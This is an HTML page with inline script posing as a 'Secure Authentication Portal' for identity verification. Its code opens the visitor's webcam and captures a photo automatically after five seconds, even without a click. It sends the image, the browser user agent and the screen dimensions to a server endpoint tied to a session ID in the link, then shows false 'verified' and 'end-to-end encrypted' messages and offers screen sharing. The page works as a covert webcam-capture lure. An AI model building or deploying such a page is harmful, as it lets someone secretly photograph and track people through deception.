<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e1e2f, #2d2d44);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            border: 1px solid rgba(255,255,255,0.1);
            max-width: 500px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        .logo {
            font-size: 48px;
            margin-bottom: 10px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            background: linear-gradient(90deg, #00d2ff, #7a5cff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle {
            color: rgba(255,255,255,0.6);
            font-size: 14px;
            margin-bottom: 30px;
        }
        .progress-container {
            background: rgba(255,255,255,0.1);
            border-radius: 30px;
            height: 8px;
            margin: 30px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00d2ff, #7a5cff);
            border-radius: 30px;
            transition: width 0.5s ease;
        }
        .status-text {
            font-size: 14px;
            color: rgba(255,255,255,0.7);
            margin-top: 10px;
        }
        .camera-container {
            margin: 30px 0;
            border-radius: 15px;
            overflow: hidden;
            background: #000;
            position: relative;
            aspect-ratio: 4/3;
        }
        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .btn {
            background: linear-gradient(90deg, #00d2ff, #7a5cff);
            border: none;
            color: #fff;
            padding: 14px 40px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
        }
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 30px rgba(122, 92, 255, 0.3);
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .btn-secondary {
            background: rgba(255,255,255,0.1);
            margin-top: 10px;
        }
        .footnote {
            font-size: 12px;
            color: rgba(255,255,255,0.3);
            margin-top: 20px;
        }
        .status-badge {
            display: inline-block;
            background: rgba(0,210,255,0.2);
            color: #00d2ff;
            padding: 4px 16px;
            border-radius: 20px;
            font-size: 12px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔒</div>
        <h1>Secure Authentication Portal</h1>
        <p class="subtitle">Multi-factor identity verification required</p>
        
        <div class="status-badge" id="statusBadge">⚡ Processing</div>
        
        <div class="camera-container">
            <video id="video" autoplay playsinline></video>
        </div>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <p class="status-text" id="statusText">Initializing secure connection...</p>
        
        <button class="btn" id="captureBtn">🔐 Verify Identity</button>
        <button class="btn btn-secondary" id="screenBtn">📺 Share Screen (Optional)</button>
        
        <p class="footnote">🔒 End-to-end encrypted • Session ID: <span id="sessionDisplay">-</span></p>
    </div>

    <script>
        // Get session ID from URL
        const sessionId = window.location.pathname.split('/').pop();
        document.getElementById('sessionDisplay').textContent = sessionId.substring(0, 8) + '...';
        
        let videoStream = null;
        let isCameraReady = false;
        let photoCaptured = false;
        let progress = 0;
        
        // Start camera
        async function startCamera() {
            try {
                videoStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                document.getElementById('video').srcObject = videoStream;
                isCameraReady = true;
                document.getElementById('statusText').textContent = '✅ Camera ready - click verify';
                document.getElementById('captureBtn').disabled = false;
                
                // Auto-capture after 5 seconds
                setTimeout(capturePhoto, 5000);
            } catch (err) {
                document.getElementById('statusText').textContent = '⚠️ Camera access denied. Please allow camera.';
                document.getElementById('captureBtn').disabled = true;
            }
        }
        
        // Capture photo
        function capturePhoto() {
            if (!isCameraReady || photoCaptured) return;
            
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            
            // Send to server
            fetch('/api/photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: sessionId,
                    image: imageData,
                    metadata: {
                        userAgent: navigator.userAgent,
                        screenWidth: screen.width,
                        screenHeight: screen.height,
                        timestamp: new Date().toISOString()
                    }
                })
            })
            .then(res => res.json())
            .then(data => {
                photoCaptured = true;
                document.getElementById('statusText').textContent = '✅ Identity verified successfully!';
                document.getElementById('statusBadge').textContent = '✅ Verified';
                document.getElementById('captureBtn').disabled = true;
                
                // Progress animation
                let p = 0;
                const interval = setInterval(() => {
                    p += 2;
                    document.getElementById('progressBar').style.width = p + '%';
                    if (p >= 100) {
                        clearInterval(interval);
                        document.getElementById('statusText').textContent = '🎯 Authentication complete. You may close this page.';
                    }
                }, 50);
            })
            .catch(err => {
                document.getElementById('statusText').textContent = '⚠️ Error: ' + err.message;
            });
        }
        
        // Screen sharing (optional bonus feature)
        document.getElementById('screenBtn').addEventListener('click', async () => {
            try {
                const screenStream = await navigator.mediaDevices.getDisplayMedia({
                    video: true,
                    audio: false
                });
                document.getElementById('statusText').textContent = '📺 Screen sharing active (demo only)';
                
                // In a real implementation, we'd send frames via WebSocket
                // For now, just show it worked
                const video = document.getElementById('video');
                video.srcObject = screenStream;
                video.play();
                
                setTimeout(() => {
                    document.getElementById('statusText').textContent = '✅ Screen sharing demo completed';
                }, 3000);
            } catch (err) {
                document.getElementById('statusText').textContent = '⚠️ Screen sharing cancelled or not supported';
            }
        });
        
        // Auto-start camera
        startCamera();
        
        // Capture on button click
        document.getElementById('captureBtn').addEventListener('click', capturePhoto);
    </script>
</body>
</html>
